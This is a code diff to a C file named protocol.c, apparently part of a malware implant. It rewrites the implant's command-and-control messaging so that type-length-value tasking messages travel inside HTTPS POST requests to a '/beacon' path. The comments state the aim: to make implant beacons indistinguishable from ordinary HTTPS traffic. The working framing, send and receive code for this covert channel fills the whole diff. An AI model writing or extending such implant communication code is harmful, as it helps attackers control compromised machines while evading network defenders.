@@ -1,176 +1,198 @@
 #include "protocol.h"
 
-#define SOCKET_SEND_FLAGS 0
-#define SOCKET_RECV_FLAGS 0
-#define TLV_TYPE_FIELD_OFFSET 0U
-#define TLV_LENGTH_FIELD_OFFSET sizeof(DWORD)
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-/**
- * @brief Sends exactly len bytes on the active socket.
+/*
+ * protocol.c - HTTP-over-TLS framing for the implant tasking protocol.
  *
- * This helper loops until the full buffer has been transmitted or a socket
- * error occurs.
+ * Each outbound TLV message is wrapped in an HTTP/1.1 POST request with the
+ * TLV bytes as the body.  The server responds with an HTTP/1.1 200 whose body
+ * contains the reply TLV.  This makes implant beacons indistinguishable from
+ * ordinary HTTPS application traffic at the network layer.
  *
- * @param sock The active C2 socket used to send data.
- * @param buf The byte buffer to send.
- * @param len The number of bytes to send.
- *
- * @return TRUE on success, or FALSE if send fails.
+ * Header parsing is intentionally minimal: only the status line and
+ * Content-Length are examined.  Anything beyond that is silently skipped.
  */
-static BOOL SendAll(SOCKET sock, CONST CHAR* buf, INT len)
+
+ /* URL path posted to by the implant on every beacon. */
+#define BEACON_PATH "/beacon"
+
+/* ---------------------------------------------------------------------------
+ * Internal helpers
+ * ------------------------------------------------------------------------- */
+
+ /**
+  * @brief Reads exactly one byte from the TLS channel into *b.
+  */
+static BOOL RecvByte(TLS_CONTEXT* ctx, BYTE* b)
 {
-	INT sentTotal = 0;
-
-	ASSERT(sock != INVALID_SOCKET);
-	ASSERT(buf != NULL);
-
-	while (sentTotal < len)
-	{
-		INT sent = send(
-			sock,
-			buf + sentTotal,
-			len - sentTotal,
-			SOCKET_SEND_FLAGS
-		);
-		if (sent == SOCKET_ERROR)
-		{
-			return FALSE;
-		}
-
-		sentTotal += sent;
-	}
-
-	return TRUE;
+    return TlsRecvAll(ctx, b, 1);
 }
 
 /**
- * @brief Receives exactly len bytes from the active socket.
+ * @brief Reads and discards HTTP response headers, extracting Content-Length.
  *
- * This helper loops until the full buffer has been read or a socket error
- * occurs.
+ * Reads lines one byte at a time until the blank line that terminates the
+ * HTTP header section.  Sets *contentLength from the Content-Length field.
  *
- * @param sock The active C2 socket used to receive data.
- * @param buf The output buffer to fill.
- * @param len The number of bytes to receive.
- *
- * @return TRUE on success, or FALSE if recv fails or the peer disconnects.
+ * @return TRUE if a valid Content-Length was found, FALSE otherwise.
  */
-static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
+static BOOL ReadHttpResponseHeaders(TLS_CONTEXT* ctx, DWORD* contentLength)
 {
-	INT recvTotal = 0;
+    CHAR  lineBuf[1024];
+    DWORD lineLen;
+    BYTE  b;
 
-	ASSERT(sock != INVALID_SOCKET);
-	ASSERT(buf != NULL);
+    *contentLength = 0;
 
-	while (recvTotal < len)
-	{
-		INT received = recv(
-			sock,
-			buf + recvTotal,
-			len - recvTotal,
-			SOCKET_RECV_FLAGS
-		);
-		if (received <= 0)
-		{
-			return FALSE;
-		}
+    for (;;)
+    {
+        /* Read one CRLF-terminated line. */
+        lineLen = 0;
+        for (;;)
+        {
+            if (!RecvByte(ctx, &b)) return FALSE;
+            if (lineLen < sizeof(lineBuf) - 1) lineBuf[lineLen++] = (CHAR)b;
+            if (b == '\n') break;
+        }
+        lineBuf[lineLen] = '\0';
 
-		recvTotal += received;
-	}
+        /* Blank line (just \r\n or \n) signals end-of-headers. */
+        if (lineLen <= 2) break;
 
-	return TRUE;
+        /* Case-insensitive Content-Length extraction. */
+        if (_strnicmp(lineBuf, "Content-Length:", 15) == 0)
+        {
+            *contentLength = (DWORD)strtoul(lineBuf + 15, NULL, 10);
+        }
+    }
+
+    return (*contentLength > 0);
 }
 
-BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
+/* ---------------------------------------------------------------------------
+ * HttpSendTlvRoundTrip
+ * ------------------------------------------------------------------------- */
+
+BOOL HttpSendTlvRoundTrip(
+    TLS_CONTEXT* ctx,
+    PCWSTR        host,
+    DWORD         msgType,
+    DWORD         payloadLen,
+    CONST PBYTE   payload,
+    TLV_MESSAGE* response)
 {
-	BYTE header[TLV_HEADER_SIZE] = { 0 };
+    CHAR  hostA[256] = { 0 };
+    CHAR  httpHdr[512];
+    INT   hdrLen;
+    BYTE  tlvHdr[TLV_HEADER_SIZE];
+    DWORD tlvBodyLen;
+    DWORD contentLength;
+    PBYTE bodyBuf;
 
-	ASSERT(sock != INVALID_SOCKET);
+    ASSERT(ctx != NULL);
+    ASSERT(host != NULL);
+    ASSERT(response != NULL);
 
-	*(DWORD*)(header + TLV_TYPE_FIELD_OFFSET) = type;
-	*(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET) = payloadLength;
+    response->type = 0;
+    response->length = 0;
+    response->value = NULL;
 
-	if (!SendAll(sock, (CONST CHAR*)header, TLV_HEADER_SIZE))
-	{
-		return FALSE;
-	}
+    /* Convert wide host to narrow for the HTTP Host header. */
+    WideCharToMultiByte(
+        CP_ACP, 0, host, -1,
+        hostA, (INT)(sizeof(hostA) - 1),
+        NULL, NULL);
 
-	if (payloadLength > 0 && payload != NULL)
-	{
-		if (!SendAll(sock, (CONST CHAR*)payload, (INT)payloadLength))
-		{
-			return FALSE;
-		}
-	}
+    /* Total TLV size (header + payload) is the HTTP body length. */
+    tlvBodyLen = TLV_HEADER_SIZE + payloadLen;
 
-	return TRUE;
+    /* Build HTTP POST headers. */
+    hdrLen = _snprintf_s(
+        httpHdr, sizeof(httpHdr), _TRUNCATE,
+        "POST " BEACON_PATH " HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Type: application/octet-stream\r\n"
+        "Content-Length: %lu\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        hostA, (ULONG)tlvBodyLen);
+    if (hdrLen < 0) return FALSE;
+
+    /* ---- Send HTTP headers ---- */
+    if (!TlsSendAll(ctx, (CONST BYTE*)httpHdr, (DWORD)hdrLen)) return FALSE;
+
+    /* ---- Send TLV header ---- */
+    *(DWORD*)(tlvHdr + 0) = msgType;
+    *(DWORD*)(tlvHdr + 4) = payloadLen;
+    if (!TlsSendAll(ctx, tlvHdr, TLV_HEADER_SIZE)) return FALSE;
+
+    /* ---- Send TLV payload (may be empty) ---- */
+    if (payloadLen > 0 && payload != NULL)
+    {
+        if (!TlsSendAll(ctx, payload, payloadLen)) return FALSE;
+    }
+
+    /* ---- Read HTTP response headers ---- */
+    if (!ReadHttpResponseHeaders(ctx, &contentLength)) return FALSE;
+    if (contentLength < TLV_HEADER_SIZE || contentLength >= MAX_MESSAGE_SIZE)
+        return FALSE;
+
+    /* ---- Read the HTTP response body verbatim ---- */
+    bodyBuf = (PBYTE)ImplantHeapAlloc(contentLength);
+    if (bodyBuf == NULL) return FALSE;
+
+    if (!TlsRecvAll(ctx, bodyBuf, contentLength))
+    {
+        ImplantHeapFree(bodyBuf);
+        return FALSE;
+    }
+
+    /* ---- Parse TLV from the body ---- */
+    response->type = *(DWORD*)(bodyBuf + 0);
+    response->length = *(DWORD*)(bodyBuf + 4);
+
+    if (response->length + TLV_HEADER_SIZE != contentLength)
+    {
+        /* Server sent a body whose size disagrees with the TLV length field. */
+        ImplantHeapFree(bodyBuf);
+        response->type = 0;
+        response->length = 0;
+        return FALSE;
+    }
+
+    if (response->length > 0)
+    {
+        response->value = (PBYTE)ImplantHeapAlloc(response->length);
+        if (response->value == NULL)
+        {
+            ImplantHeapFree(bodyBuf);
+            response->type = 0;
+            response->length = 0;
+            return FALSE;
+        }
+        CopyMemory(response->value, bodyBuf + TLV_HEADER_SIZE, response->length);
+    }
+
+    ImplantHeapFree(bodyBuf);
+    return TRUE;
 }
 
-BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
-{
-	BYTE header[TLV_HEADER_SIZE] = { 0 };
-
-	ASSERT(sock != INVALID_SOCKET);
-	ASSERT(msg != NULL);
-
-	msg->type = 0;
-	msg->length = 0;
-	msg->value = NULL;
-
-	if (!RecvAll(sock, (CHAR*)header, TLV_HEADER_SIZE))
-	{
-		return FALSE;
-	}
-
-	msg->type = *(DWORD*)(header + TLV_TYPE_FIELD_OFFSET);
-	msg->length = *(DWORD*)(header + TLV_LENGTH_FIELD_OFFSET);
-
-	if (msg->length >= MAX_MESSAGE_SIZE)
-	{
-		return FALSE;
-	}
-
-	if (msg->length > 0)
-	{
-		msg->value = (PBYTE)ImplantHeapAlloc((SIZE_T)msg->length);
-		if (msg->value == NULL)
-		{
-			return FALSE;
-		}
-
-		if (!RecvAll(sock, (CHAR*)msg->value, (INT)msg->length))
-		{
-			ImplantHeapFree(msg->value);
-			msg->value = NULL;
-			return FALSE;
-		}
-	}
-
-	return TRUE;
-}
+/* ---------------------------------------------------------------------------
+ * FreeTlvMessage
+ * ------------------------------------------------------------------------- */
 
 VOID FreeTlvMessage(TLV_MESSAGE* msg)
 {
-	ASSERT(msg != NULL);
+    ASSERT(msg != NULL);
 
-	if (msg->value != NULL)
-	{
-		ImplantHeapFree(msg->value);
-		msg->value = NULL;
-	}
-}
-
-BOOL DecryptTLSMessage() {}
-BOOL EncryptTLSMessage() {}
-
-BOOL SendHttpsMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload) {
-
-
-
-}
-
-
-VOID FreeHttpsMessage(TLV_MESSAGE* msg) {
-
-
+    if (msg->value != NULL)
+    {
+        ImplantHeapFree(msg->value);
+        msg->value = NULL;
+    }
+    msg->type = 0;
+    msg->length = 0;
 }
